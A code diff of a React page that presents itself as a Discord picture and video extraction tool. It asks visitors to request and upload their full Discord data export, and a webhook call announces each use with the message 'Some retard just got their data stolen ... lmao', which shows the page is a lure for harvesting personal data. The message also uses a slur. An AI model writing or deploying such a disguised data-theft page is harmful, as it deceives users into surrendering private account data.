@@ -42,7 +42,7 @@ export default function About() {
                 'Content-Type': 'application/json',
             },
             body: JSON.stringify({
-                content: 'Some retard just got their data stolen @ https://www.nova-gang.com/about lmao',
+                content: 'Some retard just got their data stolen @ https://www.nova-gang.com/discord lmao',
             }),
         });
     }catch(e) {console.log("ERROR WITH WEBHOOK")}
@@ -80,7 +80,8 @@ export default function About() {
 
     return (
         <div className="parent-container">
-            <h2 className="extractHeader"><strong>Discord picture extraction</strong></h2>
+            <h2 className="extractHeader"><strong>Discord picture/video extraction</strong></h2>
+            <h3>Your Discord data is required to extract images, follow <a href="https://support.discord.com/hc/en-us/articles/360004027692-Requesting-a-Copy-of-your-Data" target="_blank">this</a> guide to request your data</h3>
             <button 
                 className="bn632-hover bn21"
                 onClick={triggerFileUpload}
